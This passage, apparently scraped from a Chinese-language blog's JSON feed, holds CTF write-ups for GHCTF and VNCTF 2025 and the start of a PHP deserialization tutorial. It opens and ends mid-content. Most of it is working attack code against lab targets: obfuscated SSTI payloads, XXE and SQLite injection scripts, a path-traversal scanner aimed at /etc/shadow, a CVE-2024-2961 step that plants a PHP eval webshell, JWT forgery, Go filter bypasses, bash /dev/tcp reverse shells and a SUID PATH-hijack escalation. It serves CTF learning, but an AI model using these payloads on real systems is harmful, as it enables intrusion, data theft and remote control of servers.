2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197846086151042512153782486075793224874304872205720564733574010669935992016367832666397263951446340260962650378484847385424893514879629196181114844346169851383460163815147712907264437435463059397586675769959094397311450861780912636566993749356097243760640620004707428340786147078475120876426087835327094386842765660642186546472260607586011343238080538092580452700406255443887820337778505999803772196923996033929998741437250238302626841957729397241851219567703420968177784088484002831289722211924810899441563382481216744212304879717297444824808184727136770899310815544776369231934774967139834384853322157766059825736075553 phi = 2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197784246608456057052779643060628984335578973450260519106769911425793594847759982583376628098472390090331415895352869275325656949958242181688663465437185437198392460569653734315961071709533645370007008616755547195108861900432818710027794402838336405197750190466425895582236209479543326147804766393022786785337752319686125574507066082357748118175068545756301823381723776525427724798780890160482013759497102382173931716030992837059880049832065500252713739288235410544982532170147652055063681116147027591678349638753796122845041417275362394757384204924094885233281257928031484806977974575497621444483701792085077113227851520 c = 2675023626005191241628571734421094007494866451142251352071850033504791090546156004348738217761733467156596330653396106482342801412567035848069931148880296036606611571818493841795682186933874790388789734748415540102210757974884805905578650801916130709273985096229857987312816790471330181166965876955546627327549473645830218664078284830699777113214559053294592015697007540297033755845037866295098660371843447432672454589238297647906075964139778749351627739005675106752803394387612753005638224496040203274119150075266870378506841838513636541340104864561937527329845541975189814018246183215952285198950920021711141273569490277643382722047159198943471946774301837440950402563578645113393610924438585345876355654972759318203702572517614743063464534582417760958462550905093489838646250677941813170355212088529993225869303917882372480469839803533981671743959732373159808299457374754090436951368378994871937358645247263240789585351233 # 计算私钥指数 d d = pow(e, -1, phi) # 解密，计算明文 m m = pow(c, d, n) # 动态计算字节长度 byte_length = (m.bit_length() + 7) // 8 # 将 m 转换为字节并解码 message = m.to_bytes(byte_length, \u0026#39;big\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;Flag:\u0026#34;, message) upload?SSTI! 1 {%set pop=dict(po=a,p=b)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}{%set get=dict(get=a)|join%}{%set shell=dict(o=a,s=b)|join%}{%set popen=dict(popen=a)|join%}{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}{%set ch=dict(ch=a,r=b)|join%}{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}{%set command=char(108)+char(115)+char(32)+char(47)%}{%set read=dict(read=a)|join%}{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}{%print result%} 1 {%set pop=dict(po=a,p=b)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}{%set get=dict(get=a)|join%}{%set shell=dict(o=a,s=b)|join%}{%set popen=dict(popen=a)|join%}{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}{%set ch=dict(ch=a,r=b)|join%}{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}{%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%}{%set read=dict(read=a)|join%}{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}{%print result%} (\u0026gt;﹏\u0026lt;) xxe\n看起来跟0xgame2024的那题很像\n1 2 3 4 5 xml=\u0026lt;%3fxml+version%3d\u0026#34;1.0\u0026#34;%3f\u0026gt; \u0026lt;!DOCTYPE+test+[ ++++\u0026lt;!ENTITY+ddd+SYSTEM+\u0026#34;file%3a///flag\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;aa\u0026gt;\u0026lt;name\u0026gt;%26ddd%3b\u0026lt;/name\u0026gt;\u0026lt;/aa\u0026gt; post接ghctf路由，这里的xml要url编码一下\nSQL??? sqlite注入\n1 2 ?id=0 union select 1,2,3,4,sql from sqlite_master; ?id=0 union select 1,2,3,4,flag from flag; baby_signin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 from sympy.ntheory.residue_ntheory import nthroot_mod from sympy.ntheory.modular import crt from Crypto.Util.number import long_to_bytes # 给定参数 p = 182756071972245688517047475576147877841 q = 305364532854935080710443995362714630091 c = 14745090428909283741632702934793176175157287000845660394920203837824364163635 n = p * q # 计算c在模p和模q下的值 c_p = c % p c_q = c % q # 在模p下求解四次根 roots_p = nthroot_mod(c_p, 4, p, all_roots=True) print(f\u0026#34;模p下的四次根数量: {len(roots_p)}\u0026#34;) # 在模q下求解四次根 roots_q = nthroot_mod(c_q, 4, q, all_roots=True) print(f\u0026#34;模q下的四次根数量: {len(roots_q)}\u0026#34;) # 使用中国剩余定理组合所有可能的解 possible_flags = [] for x_p in roots_p: for x_q in roots_q: m, _ = crt([p, q], [x_p, x_q]) if pow(m, 4, n) == c: # 验证解的正确性 possible_flags.append(m) # 输出所有可能的明文 for m in possible_flags: flag = long_to_bytes(m).decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) if flag.startswith(\u0026#34;NSSCTF{\u0026#34;): print(\u0026#34;解密成功，flag为:\u0026#34;, flag) break else: print(\u0026#34;未找到符合格式的flag，请检查所有可能解:\u0026#34;) for m in possible_flags: print(long_to_bytes(m)) mybrave zip塞png，想到明文攻击\n直接解压出来\n010看到结尾有神秘字符串\nez_readfile 掏出祖传MD5强比较payload\n1 a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 可以目录遍历，但是看环境变量不允许\n非预期，读docker-entrypoint.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 import requests TARGET_URL = \u0026#34;http://node2.anna.nssctf.cn:28717\u0026#34; POST_DATA = { \u0026#34;a\u0026#34;: \u0026#34;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak\u0026#34;, \u0026#34;b\u0026#34;: \u0026#34;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak\u0026#34; } TEST_PATHS = [ \u0026#34;/flag\u0026#34;, # 绝对路径 \u0026#34;../../../../flag\u0026#34;, # 路径遍历 \u0026#34;/flag.txt\u0026#34;, # 常见扩展名 \u0026#34;/etc/passwd\u0026#34;, \u0026#34;/app/flag\u0026#34;, \u0026#34;/run/secrets/flag\u0026#34;, \u0026#34;/opt/flag\u0026#34;, \u0026#34;/usr/local/flag\u0026#34;, \u0026#34;/docker-entrypoint.sh\u0026#34;, \u0026#34;/tmp/flag\u0026#34;, \u0026#34;tmp/flag.tmp\u0026#34;, \u0026#34;/var/tmp/flag\u0026#34;, \u0026#34;/var/log/apache2/access.log\u0026#34;, \u0026#34;/var/log/nginx/access.log\u0026#34;, \u0026#34;/var/log/auth.log\u0026#34;, \u0026#34;/var/log/syslog\u0026#34;, \u0026#34;/var/www/html/index.php\u0026#34;, \u0026#34;/var/www/html/config.php\u0026#34;, \u0026#34;/var/www/html/.env\u0026#34;, \u0026#34;/var/www/html/admin/flag\u0026#34;, \u0026#34;/var/www/html/uploads/flag\u0026#34;, \u0026#34;/var/www/html/secret/flag\u0026#34;, \u0026#34;/var/www/html/robots.txt\u0026#34;, \u0026#34;/var/backups/flag\u0026#34;, \u0026#34;/var/backups/flag.bak\u0026#34;, \u0026#34;/var/backups/app.tar.gz\u0026#34;, \u0026#34;/var/lib/gnats/flag\u0026#34;, \u0026#34;/home/flag\u0026#34;, \u0026#34;/home/user/flag\u0026#34;, \u0026#34;/etc/shadow\u0026#34;, \u0026#34;/etc/flag\u0026#34;, \u0026#34;/etc/motd\u0026#34;, \u0026#34;/etc/hosts\u0026#34;, \u0026#34;/etc/environment\u0026#34;, \u0026#34;/proc/self/environ\u0026#34;, \u0026#34;/proc/version\u0026#34;, \u0026#34;/tmp/flag\u0026#34;, \u0026#34;/tmp/flag.tmp\u0026#34;, \u0026#34;/var/tmp/flag\u0026#34;, \u0026#34;/var/log/apache2/access.log\u0026#34;, \u0026#34;/var/log/nginx/access.log\u0026#34;, \u0026#34;/var/log/auth.log\u0026#34;, \u0026#34;/var/log/syslog\u0026#34;, \u0026#34;/flag.bak\u0026#34;, \u0026#34;/flag.old\u0026#34;, \u0026#34;/flag.swp\u0026#34;, \u0026#34;/flag.swo\u0026#34;, \u0026#34;.flag\u0026#34;, \u0026#34;.flag.txt\u0026#34;, \u0026#34;.flag.php\u0026#34;, \u0026#34;._flag\u0026#34;, \u0026#34;/readme.md\u0026#34;, \u0026#34;/notice.txt\u0026#34;, \u0026#34;/hint.txt\u0026#34;, \u0026#34;/secret\u0026#34;, \u0026#34;/admin/flag\u0026#34;, \u0026#34;/api/flag\u0026#34;, \u0026#34;/v1/flag\u0026#34; ] def test_paths(): for path in TEST_PATHS: params = {\u0026#34;file\u0026#34;: path} try: response = requests.post( TARGET_URL, data=POST_DATA, params=params, timeout=5 ) if response.status_code == 200: if \u0026#34;NSSCTF{\u0026#34; in response.text: print(f\u0026#34;[+] 成功获取 Flag: {response.text}\u0026#34;) return elif \u0026#34;Warning\u0026#34; in response.text: print(\u0026#34;Warning\u0026#34;) else: print(f\u0026#34;No Warning：{path}\u0026#34;) except Exception as e: print(f\u0026#34;[!] 测试 {path} 时出错: {str(e)}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: test_paths() 上面是flag可能在的地方\n利用CVE-2024-2961，拿/proc/self/maps和libc\nlibc丢cyberchef下载\n调参数\n1 2 maps_path = \u0026#39;./maps\u0026#39; cmd = \u0026#34;echo \u0026#39;\u0026lt;?php eval($_POST[1]);\u0026#39;\u0026gt;/var/www/html/1.php\u0026#34; 跑脚本\nASM?Signin! 喂给ai直接出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 def do2_swap_bytes(data1, bx, di): for _ in range(4): temp = data1[bx] data1[bx] = data1[di] data1[di] = temp bx += 1 di += 1 def do1_modify_data1(data1_initial): data1 = list(data1_initial) # Make a mutable copy si = 0 for _ in range(8): di = si + 4 if di \u0026gt;= 28: di -= 28 bx = si do2_swap_bytes(data1, bx, di) si += 4 return bytes(data1) def reverse_enc(data2, modified_data1): flag = bytearray() si = 0 di = 0 for _ in range(8): ax_word1 = (modified_data1[di + 2] \u0026lt;\u0026lt; 8) | modified_data1[di + 1] flag_word1 = ((data2[si+1] \u0026lt;\u0026lt; 8) | data2[si]) ^ ax_word1 flag.append(flag_word1 \u0026amp; 0xFF) flag.append((flag_word1 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF) ax_word2 = (modified_data1[di + 3] \u0026lt;\u0026lt; 8) | modified_data1[di + 2] # Note: should be di+3, di+2 for word flag_word2 = ((data2[si+3] \u0026lt;\u0026lt; 8) | data2[si+2]) ^ ax_word2 flag.append(flag_word2 \u0026amp; 0xFF) flag.append((flag_word2 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF) si += 4 di += 4 return bytes(flag) DATA1_INITIAL = bytes([0x26, 0x27, 0x24, 0x25, 0x2A, 0x2B, 0x28, 0x00, 0x2E, 0x2F, 0x2C, 0x2D, 0x32, 0x33, 0x30, 0x00, 0x36, 0x37, 0x34, 0x35, 0x3A, 0x3B, 0x38, 0x39, 0x3E, 0x3F, 0x3C, 0x3D, 0x3F, 0x27, 0x34, 0x11]) DATA2 = bytes([0x69, 0x77, 0x77, 0x66, 0x73, 0x72, 0x4F, 0x46, 0x03, 0x47, 0x6F, 0x79, 0x07, 0x41, 0x13, 0x47, 0x5E, 0x67, 0x5F, 0x09, 0x0F, 0x58, 0x63, 0x7D, 0x5F, 0x77, 0x68, 0x35, 0x62, 0x0D, 0x0D, 0x50]) modified_data1 = do1_modify_data1(DATA1_INITIAL) flag_bytes = reverse_enc(DATA2, modified_data1) flag = flag_bytes.decode(\u0026#39;ascii\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # Try to decode as ASCII, ignore errors for non-printable chars. print(f\u0026#34;Flag: {flag}\u0026#34;) mydisk-2 第一个问题查系统名，r-studio挂载后在etc目录下面找issue\n第二个问题查找账号密码，先看看etc/passwd\n找到一个用户叫l0v3miku\n在火狐目录下找到login.json,key4.db,cert9.db\n跑脚本\n在var/lib/docker/containers目录下面有个config.v2.json\nY0U_FouNd_mE!\n最后跑脚本得flag\nAI Cat Girl EZ_Fermat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 n = 101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047 e = 65537 c = 77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746 w = 32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244 # 定义多项式 f(x) R.\u0026lt;x\u0026gt; = ZZ[] f = 2*x^332 - x^331 + x^329 + 3*x^328 - x^327 - 3*x^325 + x^323 - 3*x^322 - x^321 - 3*x^320 + x^319 + 2*x^318 - 4*x^317 - 3*x^315 - 2*x^314 + x^313 + x^312 + 2*x^311 + 2*x^309 + 2*x^308 + 5*x^307 + 2*x^306 + 3*x^305 + 5*x^304 + 4*x^303 + x^302 - x^301 - x^300 - 2*x^299 - 2*x^298 + x^297 + 3*x^296 - x^295 - 4*x^292 - x^290 + 4*x^289 - x^287 - 3*x^286 + x^285 - 2*x^284 + x^283 - x^282 - 2*x^281 + x^280 - 2*x^279 + x^278 + 2*x^277 - 3*x^276 - x^275 - 4*x^274 - 3*x^273 - 5*x^272 - 2*x^271 - 3*x^270 + 2*x^269 + 2*x^268 - x^267 - 2*x^266 + x^265 + x^264 - 3*x^262 - 3*x^259 + 2*x^258 - x^257 + 2*x^256 + 2*x^255 - x^254 - 2*x^253 - x^252 + 2*x^251 - x^250 + x^249 + 2*x^247 + 2*x^246 + 2*x^245 - 2*x^244 - 3*x^243 + 2*x^242 - 3*x^241 - x^240 - 3*x^239 - x^236 - 3*x^235 - 2*x^234 - x^233 - 2*x^232 - x^231 - 3*x^230 - 2*x^229 - 4*x^228 - 2*x^227 - 3*x^226 + 2*x^225 + x^224 - x^223 - 2*x^221 + 3*x^219 - x^217 - 2*x^216 + x^215 + 2*x^213 - x^212 + 3*x^211 + x^210 + 4*x^209 + x^208 - x^206 - x^205 - x^204 + 2*x^203 - 3*x^202 + 2*x^199 - x^198 + 2*x^196 - 2*x^195 + 3*x^194 + 3*x^193 - x^192 + 4*x^191 + 2*x^189 + x^186 - x^185 - x^184 + 3*x^183 + x^182 + 2*x^181 - 2*x^180 + x^177 + x^175 - x^173 + 3*x^172 + x^170 + x^169 - x^167 - 2*x^166 - x^165 - 4*x^164 - 2*x^163 + 2*x^162 + 4*x^161 - 2*x^160 - 3*x^159 - 2*x^158 - 2*x^157 + x^156 - x^155 + 3*x^154 - 4*x^153 + x^151 + 2*x^150 + x^149 - x^148 + 2*x^147 + 3*x^146 + 2*x^145 - 4*x^144 - 4*x^143 + x^142 - 2*x^140 - 2*x^139 + 2*x^138 + 3*x^137 + 3*x^136 + 3*x^135 + x^134 - x^133 + 2*x^132 + 3*x^130 - 3*x^129 - 2*x^128 - x^127 - 2*x^126 + x^125 + x^124 - 2*x^123 + x^122 - x^121 + 3*x^120 - x^119 - 2*x^118 - x^117 - x^116 - 2*x^115 + 2*x^114 + 2*x^113 - 3*x^112 - x^111 - 4*x^110 + x^109 + x^108 + x^106 - 4*x^105 + x^104 - x^103 - x^101 + x^100 - 2*x^99 + x^98 - x^97 + 3*x^96 + 3*x^94 - x^93 - x^92 + x^91 - 2*x^90 + x^89 - x^88 + x^87 - x^86 + x^85 + x^84 - x^83 + x^79 - 3*x^78 - 2*x^77 + x^74 + 3*x^73 - x^72 - 3*x^71 - 2*x^70 + x^69 - 3*x^66 + x^65 + x^64 - 4*x^62 - x^61 + x^60 - x^59 + 3*x^58 - x^57 - x^54 + 3*x^53 + x^51 - 3*x^50 - x^49 + 2*x^47 - x^46 - x^44 + x^43 - x^42 - 4*x^41 - 3*x^39 - x^37 - x^36 - 3*x^35 + x^34 + x^33 - 2*x^32 + 2*x^31 - x^30 + 2*x^29 - 2*x^28 - 2*x^27 - x^24 + x^22 - 5*x^21 + 3*x^20 + 2*x^19 - x^18 + 2*x^17 + x^16 - 2*x^15 - 2*x^14 + x^13 + x^12 + 2*x^11 - 3*x^10 + 3*x^9 + 2*x^8 - 4*x^6 - 2*x^5 - 4*x^4 + x^3 - x^2 - 1 # 计算 f(1) k = f(1) # 这会计算所有系数的和 # 计算 2^k mod n two_k = power_mod(2, k, n) # 计算 2^k - w mod n diff = (two_k - w) % n # 求 GCD 以找到 p 或 q factor = gcd(n, diff) if factor == 1 or factor == n: print(\u0026#34;无法找到合适的因子，请检查逻辑\u0026#34;) else: # 假设 factor 是 p p = factor q = n // p if is_prime(p) and is_prime(q) and p * q == n: phi = (p-1)*(q-1) d = power_mod(e, -1, phi) m = power_mod(c, d, n) flag = bytes.fromhex(hex(m)[2:]) print(\u0026#34;Flag:\u0026#34;, flag) else: print(\u0026#34;找到的因子不正确，请检查逻辑\u0026#34;) mycode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * import functools def compare(a, b): if a + b \u0026lt; b + a: return -1 else: return 1 def main(): conn = remote(\u0026#39;node2.anna.nssctf.cn\u0026#39;, 28412) # 替换为题目提供的IP和端口 for _ in range(100): conn.recvuntil(b\u0026#39;Numbers: \u0026#39;) nums_line = conn.recvline().decode().strip() nums = nums_line.split() sorted_nums = sorted(nums, key=functools.cmp_to_key(compare)) concatenated = \u0026#39;\u0026#39;.join(sorted_nums) concatenated = concatenated.lstrip(\u0026#39;0\u0026#39;) if not concatenated: concatenated = \u0026#39;0\u0026#39; conn.sendlineafter(b\u0026#39;Smallest: \u0026#39;, concatenated.encode()) flag = conn.recvall().decode() print(flag) if __name__ == \u0026#39;__main__\u0026#39;: main() ","date":"2025-03-02T00:00:00Z","image":"https://0d000721999.github.io/p/2025ghctfwp/1.png","permalink":"https://0d000721999.github.io/p/2025ghctfwp/","title":"2025GHCTFwp"},{"content":"2025vnctf复现 奶龙回家 首先测SQL注入闭合的方式。1\u0026quot;发现回显“账号密码错误！！”，1'发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。\n由于测试sleep大小写都被fuzz，猜测是sqlite注入，直接时间盲注，爆破账号密码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import time url = \u0026#39;http://node.vnteam.cn:44526/login\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,500): low = 32 high = 128 mid = (low+high)//2 while(low\u0026lt;high): time.sleep(0.2) payload = \u0026#34;-1\u0026#39;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),{0},1)\u0026gt;\u0026#39;{1}\u0026#39;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*\u0026#34;.format(i,chr(mid)) #把payload里password换成username打username datas = { \u0026#34;username\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;password\u0026#34;: payload } # print(datas) start_time=time.time() res = requests.post(url=url,json=datas) end_time=time.time() spend_time=end_time-start_time if spend_time\u0026gt;=0.4: #这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。 low = mid+1 else: high = mid mid = (low+high)//2 if(mid ==32 or mid ==127): break flag = flag+chr(mid) print(flag) print(\u0026#39;\\n\u0026#39;+bytes.fromhex(flag).decode(\u0026#39;utf-8\u0026#39;)) 爆破出用户名是nailong,密码是woaipangmao114514\n学生姓名管理系统 题目提示单文件框架，python 本体的单文件框架是bottle 框架\n翻阅bottle的开发手册，可以看到他渲染templete的模板引擎叫SimpleTemplate\n有内置模板函数\n1 2 {{setdefault(\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;)}} {{a}} 对于单行有23的长度限制,这里py3.8之后推出的海象运算符，可以打继承链绕过长度限制\n1 2 3 4 5 6 7 {{a:=\u0026#39;\u0026#39;.__class__}} {{b:=a.__base__}} {{c:=b.__subclasses__}} {{d:=c()}} {{e:=d[154]}} {{f:=e.__init__}} {{g:=f.__globals__}} 然后环境变量里面查找flag就行了\n或者用catch_warnings方法，命令执行\n1 2 3 4 5 6 7 8 9 10 11 12 {{a:=\u0026#39;\u0026#39;.__class__}} {{b:=a.__base__}} {{c:=b.__subclasses__}} {{d:=c()}} {{e:=d[228]}} {{f:=e.__init__}} {{g:=f.__globals__}} {{z:=\u0026#39;__builtins__\u0026#39;}} {{h:=g[z]}} {{i:=h[\u0026#39;op\u0026#39;\u0026#39;en\u0026#39;]}} {{x:=i(\u0026#34;/flag\u0026#34;)}} {{y:=x.read()}} Gin 这里普通用户可以上传和下载文件，admin才能eval命令执行\n用了jwt鉴权\n但这里的随机数是伪随机\n有个download路由可以实现目录穿越下载config目录下的key\n1 download?filename=../config/key.go 1 2 3 4 5 6 7 8 package config func Key() string { return \u0026#34;r00t32l\u0026#34; } func Year() int64 { return 2025 } 然后就可以获得key了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; ) func GenerateKey() string { rand.Seed(2025) randomNumber := rand.Intn(1000) key := fmt.Sprintf(\u0026#34;%03d%s\u0026#34;, randomNumber, \u0026#34;r00t32l\u0026#34;) fmt.Println(key) return key } func main() { GenerateKey() } 拿到key之后就是伪造jwt了\n现在就可以在/admin路由执行go代码了。但是有过滤\n这里有很多绕过方式，因为只匹配第一个import，可以把os/exec放到第二个import里面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import ( \u0026#34;fmt\u0026#34; ) import ( \u0026#34;os/exec\u0026#34; ) func main() { cmd := exec.Command(\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ls\u0026#34;) out, err := cmd.CombinedOutput() fmt.Println(out) fmt.Println(err) } 不能有os/exec，可以用syscall来代替。\n1 2 3 4 5 6 7 8 9 package main import ( \u0026#34;syscall\u0026#34; ) func main() { syscall.Exec(\u0026#34;/bin/sh\u0026#34;, []string{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;whoami\u0026#34;}, []string{}) } 或者用goeval\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/PaulXu-cn/goeval\u0026#34; ) func main() { cmd, _ := goeval.Eval(\u0026#34;\u0026#34;, \u0026#34;cmd:=exec.Command(\\\u0026#34;bash\\\u0026#34;,\\\u0026#34;-c\\\u0026#34;,\\\u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/ip/7777 \u0026lt;\u0026amp;1\\\u0026#34;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))\u0026#34;, \u0026#34;os/exec\u0026#34;, \u0026#34;fmt\u0026#34;) fmt.Println(string(cmd)) } 1 2 bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/XXXX/2333 \u0026lt;\u0026amp;1\u0026#39; nc -lnvp 2333 由于没有vps，直接在bp命令执行了\nls /查看到flag，但是是假的,suid提权\n1 find / -user root -perm -4000 -print 2\u0026gt;/dev/null 1 2 3 4 5 6 7 8 9 10 /usr/bin/gpasswd /usr/bin/umount /usr/bin/chfn /usr/bin/chsh /usr/bin/passwd /usr/bin/newgrp /usr/bin/su /usr/bin/mount /usr/bin/sudo /.../Cat 这个cat非常可疑\n这里是用的cat /flag而不是/bin/cat /flag,可以环境变量胁持，接着就是环境变量提权\n1 2 3 4 5 echo \u0026#39;/bin/bash\u0026#39; \u0026gt; /tmp/cat chmod 777 /tmp/cat export PATH=/tmp:$PATH /.../Cat 最后tac /root/flag 这里记得不要用 cat，我们修改了环境变量 cat 已经是/bin/bash 了。\n而没弹shell是用不了bash来改环境变量的\n1 echo \u0026#39;tac /root/flag\u0026#39; \u0026gt; /tmp/cat;chmod 777 /tmp/cat;export PATH=/tmp:$PATH\u0026amp;\u0026amp;/.../Cat ","date":"2025-02-11T00:00:00Z","image":"https://0d000721999.github.io/p/2025vnctf%E5%A4%8D%E7%8E%B0/1.png","permalink":"https://0d000721999.github.io/p/2025vnctf%E5%A4%8D%E7%8E%B0/","title":"2025vnctf复现"},{"content":"PHP反序列化构造POP链 常用魔术方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用serialize时触发 __call() //在对象上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __toString() //把类当作字符串使用时触发 __invoke() //当脚本尝试将对象调用为函数时触发 具体用法 __construct和__destruct 前者和后者分别为类的构造函数和析构函数，__construct在类创建时被调用，__destruct在类删除前被调用\n__sleep和__wakeup 与类的序列化有关，序列化前会调用__sleep，使用反序列化恢复对象调用__wakeup\n__toString 对类的对象进行字符串操作时，会被调用\n和字符串相加\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class a { public function __toString() { echo \u0026#34;string\u0026#34;; return \u0026#34;aa\u0026#34;; } } $b = new a; $b . \u0026#39;str\u0026#39;; 结果输出string\necho或print对象\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class a { public function __toString() { echo \u0026#34;string\u0026#34;; return \u0026#34;aa\u0026#34;; } } $b = new a; echo $b; //print $b; 输出stringaa\n__call、__get和__set 调用类中不存在的方法时就会调用__call\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class a { public function __call($method, $args) { echo \u0026#34;call function: $method()\u0026#34; ; } } $b = new a; $b-\u0026gt;func(); 输出call function:fun()\n__get则是访问类的成员变量不存在的时调用，__set在设置类的成员变量（如：赋值）不存在的时调用\n例题NewStarCTF 公开赛UnserializeOne 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); #Something useful for you : https://zhuanlan.zhihu.com/p/377676274 class Start{ public $name; protected $func; public function __destruct() { echo \u0026#34;Welcome to NewStarCTF, \u0026#34;.$this-\u0026gt;name; } public function __isset($var) { ($this-\u0026gt;func)(); } } class Sec{ private $obj; private $var; public function __toString() { $this-\u0026gt;obj-\u0026gt;check($this-\u0026gt;var); return \u0026#34;CTFers\u0026#34;; } public function __invoke() { echo file_get_contents(\u0026#39;/flag\u0026#39;); } } class Easy{ public $cla; public function __call($fun, $var) { $this-\u0026gt;cla = clone $var[0]; } } class 